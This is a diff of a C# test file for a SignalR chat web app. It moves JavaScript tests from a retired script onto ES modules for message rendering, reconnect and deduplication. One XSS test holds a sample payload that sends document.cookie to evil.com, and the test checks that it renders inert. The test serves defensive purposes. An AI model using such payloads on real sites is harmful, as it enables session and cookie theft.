@@ -57,12 +57,18 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
         return current.FullName;
     }
 
+    private static string JsUrl(string fileName)
+    {
+        var path = Path.Combine(FindSolutionRoot(), "src", "AOS.Messenger.Web", "wwwroot", "js", fileName);
+        return new Uri(path).AbsoluteUri;
+    }
+
     private static (int ExitCode, string Output, string Error) RunNodeScript(string script)
     {
         var psi = new ProcessStartInfo
         {
             FileName = "node",
-            Arguments = "-",
+            Arguments = "--input-type=module -",
             RedirectStandardInput = true,
             RedirectStandardOutput = true,
             RedirectStandardError = true,
@@ -94,21 +100,28 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     public void RealtimeAssets_ExistAndAreNonEmpty()
     {
         var slnRoot = FindSolutionRoot();
-        var chatRealtimePath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
+        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
+        var chatShellPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-shell.js");
+        var messageRendererPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "message-renderer.js");
+        var sidebarPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "sidebar.js");
+        var legacyChatRealtimePath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
         var signalrMinPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "lib", "signalr", "signalr.min.js");
         var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");
 
-        Assert.True(File.Exists(chatRealtimePath), $"chat-realtime.js not found at: {chatRealtimePath}");
+        Assert.True(File.Exists(signalrClientPath), $"signalr-client.js not found at: {signalrClientPath}");
+        Assert.True(File.Exists(chatShellPath), $"chat-shell.js not found at: {chatShellPath}");
+        Assert.True(File.Exists(messageRendererPath), $"message-renderer.js not found at: {messageRendererPath}");
+        Assert.True(File.Exists(sidebarPath), $"sidebar.js not found at: {sidebarPath}");
+        Assert.False(File.Exists(legacyChatRealtimePath), "Legacy chat-realtime.js must remain retired.");
         Assert.True(File.Exists(signalrMinPath), $"signalr.min.js not found at: {signalrMinPath}");
         Assert.True(File.Exists(conversationViewPath), $"Conversation.cshtml not found at: {conversationViewPath}");
 
-        var chatRealtimeContent = File.ReadAllText(chatRealtimePath);
-        var signalrMinContent = File.ReadAllText(signalrMinPath);
-        var conversationViewContent = File.ReadAllText(conversationViewPath);
-
-        Assert.True(chatRealtimeContent.Length > 500, "chat-realtime.js should contain substantial implementation.");
-        Assert.True(signalrMinContent.Length > 10000, "signalr.min.js should contain the minified SignalR client library.");
-        Assert.True(conversationViewContent.Length > 500, "Conversation.cshtml should contain view markup and scripts.");
+        Assert.True(File.ReadAllText(signalrClientPath).Length > 500, "signalr-client.js should contain substantial implementation.");
+        Assert.True(File.ReadAllText(chatShellPath).Length > 500, "chat-shell.js should contain substantial implementation.");
+        Assert.True(File.ReadAllText(messageRendererPath).Length > 500, "message-renderer.js should contain substantial implementation.");
+        Assert.True(File.ReadAllText(sidebarPath).Length > 500, "sidebar.js should contain substantial implementation.");
+        Assert.True(File.ReadAllText(signalrMinPath).Length > 10000, "signalr.min.js should contain the minified SignalR client library.");
+        Assert.True(File.ReadAllText(conversationViewPath).Length > 500, "Conversation.cshtml should contain view markup and scripts.");
     }
 
     [Fact]
@@ -129,9 +142,11 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
         var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");
         var content = File.ReadAllText(conversationViewPath);
 
-        // Verify script references in @section Scripts with cache-busting asp-append-version
+        // Unified Chat Shell loads signalr.min.js + chat-shell.js once (never duplicate chat-realtime.js)
         Assert.Contains("<script src=\"~/lib/signalr/signalr.min.js\" asp-append-version=\"true\"></script>", content);
-        Assert.Contains("<script src=\"~/js/chat-realtime.js\" asp-append-version=\"true\"></script>", content);
+        Assert.Contains("<script type=\"module\" src=\"~/js/chat-actions.js\" asp-append-version=\"true\"></script>", content);
+        Assert.Contains("<script type=\"module\" src=\"~/js/chat-shell.js\" asp-append-version=\"true\"></script>", content);
+        Assert.DoesNotContain("chat-realtime.js", content);
     }
 
     [Fact]
@@ -153,12 +168,19 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     {
         var slnRoot = FindSolutionRoot();
         var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");
-        var content = File.ReadAllText(conversationViewPath);
+        var chatShellPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-shell.js");
+        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
 
-        Assert.Contains("ChatRealtime.init({", content);
-        Assert.Contains("conversationId: conversationId", content);
-        Assert.Contains("currentUserId: currentUserId", content);
-        Assert.Contains("initialCursor: nextCursor", content);
+        var content = File.ReadAllText(conversationViewPath);
+        var shellContent = File.ReadAllText(chatShellPath);
+        var clientContent = File.ReadAllText(signalrClientPath);
+
+        Assert.Contains("id=\"chat-bootstrap\"", content);
+        Assert.Contains("initialConversationId", content);
+        Assert.Contains("currentUserId", content);
+        Assert.Contains("nextCursor", content);
+        Assert.Contains("createSignalRClient", shellContent);
+        Assert.Contains("JoinConversation", clientContent);
     }
 
     // =========================================================================
@@ -168,16 +190,10 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     [Fact]
     public void ChatRealtimeJs_GetMessageId_HandlesMultipleIdRepresentations()
     {
-        var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js").Replace("\\", "/");
+        var rendererUrl = JsUrl("message-renderer.js");
 
         var testScript = $@"
-            const fs = require('fs');
-            const code = fs.readFileSync('{jsPath}', 'utf8');
-            const window = {{}};
-            eval(code);
-
-            const getMessageId = window.ChatRealtime.getMessageId;
+            import {{ getMessageId }} from '{rendererUrl}';
 
             // 1. String ID
             if (getMessageId('msg-123') !== 'msg-123') process.exit(1);
@@ -205,18 +221,16 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     [Fact]
     public void ChatRealtimeJs_IsMessageRendered_ChecksElementIdAndDataAttribute()
     {
-        var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js").Replace("\\", "/");
+        var rendererUrl = JsUrl("message-renderer.js");
 
         var testScript = $@"
-            const fs = require('fs');
-            const code = fs.readFileSync('{jsPath}', 'utf8');
+            import {{ isMessageRendered }} from '{rendererUrl}';
 
             const mockDom = {{
                 'msg-alpha': {{ id: 'msg-alpha' }}
             }};
 
-            global.document = {{
+            globalThis.document = {{
                 getElementById: (id) => mockDom[id] || null,
                 querySelector: (selector) => {{
                     if (selector === '[data-message-id=""beta""]') return {{ dataset: {{ messageId: 'beta' }} }};
@@ -224,19 +238,14 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
                 }}
             }};
 
-            global.window = global;
-            eval(code);
-
-            const isRendered = global.ChatRealtime.isMessageRendered;
-
             // Should find by id='msg-alpha'
-            if (!isRendered('alpha')) process.exit(1);
+            if (!isMessageRendered('alpha')) process.exit(1);
 
             // Should find by data-message-id='beta'
-            if (!isRendered('beta')) process.exit(2);
+            if (!isMessageRendered('beta')) process.exit(2);
 
             // Should return false for unrendered message
-            if (isRendered('gamma')) process.exit(3);
+            if (isMessageRendered('gamma')) process.exit(3);
 
             console.log('SUCCESS');
         ";
@@ -250,51 +259,53 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     public void ChatRealtimeJs_ReceiveMessage_DeduplicatesAgainstExistingDomElements()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
-        var content = File.ReadAllText(jsPath);
+        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
+        var rendererPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "message-renderer.js");
+        var content = File.ReadAllText(signalrClientPath) + "\n" + File.ReadAllText(rendererPath);
 
-        // Assert that ReceiveMessage handler checks isMessageRendered and returns early
-        Assert.Contains("connection.on(\"ReceiveMessage\", function (message)", content);
-        Assert.Contains("if (isMessageRendered(msgId))", content);
-        Assert.Contains("return;", content);
+        // Assert that ReceiveMessage handler delegates to insertMessageOrdered which deduplicates against existing DOM elements
+        Assert.Contains("connection.on('ReceiveMessage'", content);
+        Assert.Contains("insertMessageOrdered", content);
+        Assert.Contains("document.getElementById(`msg-${msgId}`)", content);
+        Assert.Contains("if (!msgId || isMessageRendered(msgId)) continue;", content);
     }
 
     [Fact]
     public void ChatRealtimeJs_InsertMissingMessages_SkipsAlreadyRenderedMessages()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
+        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
         var content = File.ReadAllText(jsPath);
 
-        // Assert that insertMissingMessages checks isMessageRendered before inserting
-        Assert.Contains("function insertMissingMessages(messages)", content);
-        Assert.Contains("if (!msgId || isMessageRendered(msgId))", content);
-        Assert.Contains("continue;", content);
+        // Assert that reconcileActiveConversation checks isMessageRendered before inserting
+        Assert.Contains("async function reconcileActiveConversation", content);
+        Assert.Contains("if (!msgId || isMessageRendered(msgId)) continue;", content);
     }
 
     [Fact]
     public void ChatRealtimeJs_ReconcileState_QueriesAuthoritativeRestEndpoint_WithLatestCursor()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
-        var content = File.ReadAllText(jsPath);
+        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
+        var apiClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "api-client.js");
+        var content = File.ReadAllText(signalrClientPath) + "\n" + File.ReadAllText(apiClientPath);
 
         // Assert keyset state reconciliation query (RT-005: queries latest page without inverted cursor)
-        Assert.Contains("async function reconcileState()", content);
-        Assert.Contains("/api/conversations/${conversationId}/messages?pageSize=30", content);
+        Assert.Contains("async function reconcileActiveConversation", content);
+        Assert.Contains("getConversationBundle(convId, { pageSize: 30 })", content);
 
         // Assert caller accepts JSON
-        Assert.Contains("headers: { 'Accept': 'application/json' }", content);
+        Assert.Contains("'Accept': 'application/json'", content);
 
         // Assert insertion of missing messages
-        Assert.Contains("insertMissingMessages(latestData.messages)", content);
+        Assert.Contains("insertMessageOrdered(containerEl, msg, state.currentUserId, state.activeMeta)", content);
     }
 
     [Fact]
     public void ChatRealtimeJs_AutomaticReconnect_ConfiguresExponentialBackoffIntervals()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
+        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
         var content = File.ReadAllText(jsPath);
 
         // Verify automatic reconnect configuration with 0, 2s, 5s, 10s, 30s backoff delays
@@ -305,34 +316,29 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     public void ChatRealtimeJs_OnReconnected_InvokesJoinConversationAndReconcileState()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
+        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
         var content = File.ReadAllText(jsPath);
 
         // Verify onreconnected re-joins conversation room and initiates state reconciliation
-        Assert.Contains("connection.onreconnected(async (connectionId) =>", content);
-        Assert.Contains("await connection.invoke(\"JoinConversation\", conversationId);", content);
-        Assert.Contains("await reconcileState();", content);
+        Assert.Contains("connection.onreconnected(async () =>", content);
+        Assert.Contains("await connection.invoke('JoinConversation', target);", content);
+        Assert.Contains("await reconcileActiveConversation(activeId, epoch);", content);
     }
 
     [Fact]
     public void ChatRealtime_SimulatedClientDeduplication_NeverProducesDuplicateMessages_UnderConcurrentRestAndSignalR()
     {
-        var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js").Replace("\\", "/");
+        var rendererUrl = JsUrl("message-renderer.js");
 
         var testScript = $@"
-            const fs = require('fs');
-            const code = fs.readFileSync('{jsPath}', 'utf8');
+            import {{ getMessageId, isMessageRendered, createMessageBubbleHtml }} from '{rendererUrl}';
 
             const domElements = new Map();
 
-            global.document = {{
+            globalThis.document = {{
                 getElementById: (id) => domElements.get(id) || null,
                 querySelector: (sel) => null
             }};
-
-            global.window = global;
-            eval(code);
 
             const container = {{
                 insertAdjacentHTML: (pos, html) => {{
@@ -349,7 +355,6 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
 
             // Mock options
             const currentUserId = 'user-current-111';
-            const convId = 'conv-test-999';
 
             // 1. Initial REST messages (IDs: msg-1, msg-2, msg-3)
             const initialMessages = [
@@ -359,9 +364,9 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
             ];
 
             for (const msg of initialMessages) {{
-                const id = window.ChatRealtime.getMessageId(msg);
-                if (!window.ChatRealtime.isMessageRendered(id)) {{
-                    const html = window.ChatRealtime.createMessageBubbleHtml(msg, currentUserId);
+                const id = getMessageId(msg);
+                if (!isMessageRendered(id)) {{
+                    const html = createMessageBubbleHtml(msg, currentUserId);
                     container.insertAdjacentHTML('beforeend', html);
                 }}
             }}
@@ -372,9 +377,9 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
 
             // 2. Incoming SignalR broadcast for msg-3 (DUPLICATE arriving via realtime)
             const dupSignalRMessage = {{ id: 'msg-3', content: 'Third message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:02:00Z' }};
-            const dupId = window.ChatRealtime.getMessageId(dupSignalRMessage);
-            if (!window.ChatRealtime.isMessageRendered(dupId)) {{
-                const html = window.ChatRealtime.createMessageBubbleHtml(dupSignalRMessage, currentUserId);
+            const dupId = getMessageId(dupSignalRMessage);
+            if (!isMessageRendered(dupId)) {{
+                const html = createMessageBubbleHtml(dupSignalRMessage, currentUserId);
                 container.insertAdjacentHTML('beforeend', html);
             }}
 
@@ -385,9 +390,9 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
 
             // 3. Incoming SignalR broadcast for msg-4 (NEW message)
             const newSignalRMessage = {{ id: 'msg-4', content: 'Fourth message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:03:00Z' }};
-            const newId = window.ChatRealtime.getMessageId(newSignalRMessage);
-            if (!window.ChatRealtime.isMessageRendered(newId)) {{
-                const html = window.ChatRealtime.createMessageBubbleHtml(newSignalRMessage, currentUserId);
+            const newId = getMessageId(newSignalRMessage);
+            if (!isMessageRendered(newId)) {{
+                const html = createMessageBubbleHtml(newSignalRMessage, currentUserId);
                 container.insertAdjacentHTML('beforeend', html);
             }}
 
@@ -404,9 +409,9 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
             ];
 
             for (const msg of reconciledMessages) {{
-                const rId = window.ChatRealtime.getMessageId(msg);
-                if (!window.ChatRealtime.isMessageRendered(rId)) {{
-                    const html = window.ChatRealtime.createMessageBubbleHtml(msg, currentUserId);
+                const rId = getMessageId(msg);
+                if (!isMessageRendered(rId)) {{
+                    const html = createMessageBubbleHtml(msg, currentUserId);
                     container.insertAdjacentHTML('beforeend', html);
                 }}
             }}
@@ -436,16 +441,12 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     [InlineData("Foo & Bar < Baz > \"Qux\" 'Corge'", "Foo &amp; Bar &lt; Baz &gt; &quot;Qux&quot; &#39;Corge&#39;")]
     public void ChatRealtimeJs_EscapeHtml_SanitizesSpecialCharacters(string rawInput, string expectedEscaped)
     {
-        var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js").Replace("\\", "/");
+        var rendererUrl = JsUrl("message-renderer.js");
 
         var testScript = $@"
-            const fs = require('fs');
-            const code = fs.readFileSync('{jsPath}', 'utf8');
-            const window = {{}};
-            eval(code);
+            import {{ escapeHtml }} from '{rendererUrl}';
 
-            const result = window.ChatRealtime.escapeHtml({System.Text.Json.JsonSerializer.Serialize(rawInput)});
+            const result = escapeHtml({System.Text.Json.JsonSerializer.Serialize(rawInput)});
             console.log(result);
         ";
 
@@ -458,7 +459,7 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     public void ChatRealtimeJs_CreateMessageBubbleHtml_EscapesAllUserControlledFields()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
+        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "message-renderer.js");
         var content = File.ReadAllText(jsPath);
 
         // Verify escapeHtml is applied to all user-controlled text
@@ -475,14 +476,10 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     [Fact]
     public void ChatRealtimeJs_CreateMessageBubbleHtml_DeletedForEveryone_MasksContent()
     {
-        var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js").Replace("\\", "/");
+        var rendererUrl = JsUrl("message-renderer.js");
 
         var testScript = $@"
-            const fs = require('fs');
-            const code = fs.readFileSync('{jsPath}', 'utf8');
-            const window = {{}};
-            eval(code);
+            import {{ createMessageBubbleHtml }} from '{rendererUrl}';
 
             const deletedMessage = {{
                 id: 'msg-del-1',
@@ -493,7 +490,7 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
                 createdAtUtc: '2026-11-19T20:00:00Z'
             }};
 
-            const html = window.ChatRealtime.createMessageBubbleHtml(deletedMessage, 'user-2');
+            const html = createMessageBubbleHtml(deletedMessage, 'user-2');
 
             // Must contain deleted placeholder
             if (!html.includes('This message was deleted')) process.exit(1);
@@ -512,14 +509,10 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     [Fact]
     public void ChatRealtime_NodeExecution_VerifiesAdversarialXssPayloadsAreInert()
     {
-        var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js").Replace("\\", "/");
+        var rendererUrl = JsUrl("message-renderer.js");
 
         var testScript = $@"
-            const fs = require('fs');
-            const code = fs.readFileSync('{jsPath}', 'utf8');
-            const window = {{}};
-            eval(code);
+            import {{ createMessageBubbleHtml }} from '{rendererUrl}';
 
             const payloads = [
                 '<script>fetch(""http://evil.com/steal?cookie="" + document.cookie)</script>',
@@ -544,7 +537,7 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
                     }}
                 }};
 
-                const html = window.ChatRealtime.createMessageBubbleHtml(msg, 'victim-user');
+                const html = createMessageBubbleHtml(msg, 'victim-user');
 
                 // Assert zero raw dangerous opening tags
                 if (html.includes('<script>') || html.includes('<script ') || html.includes('</script>')) {{
@@ -646,13 +639,13 @@ public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatab
     public void ChatRealtimeJs_RegistersPageLifecycleHandlers_ToLeaveConversationOnUnload()
     {
         var slnRoot = FindSolutionRoot();
-        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
+        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
         var content = File.ReadAllText(jsPath);
 
         // Verify lifecycle cleanup listeners are registered
-        Assert.Contains("window.addEventListener('beforeunload', handleLeave);", content);
-        Assert.Contains("window.addEventListener('pagehide', handleLeave);", content);
-        Assert.Contains("connection.invoke(\"LeaveConversation\", conversationId)", content);
+        Assert.Contains("window.addEventListener('beforeunload', handlePageLeave);", content);
+        Assert.Contains("window.addEventListener('pagehide', handlePageLeave);", content);
+        Assert.Contains("connection.invoke('LeaveConversation', current)", content);
     }
 
     // =========================================================================
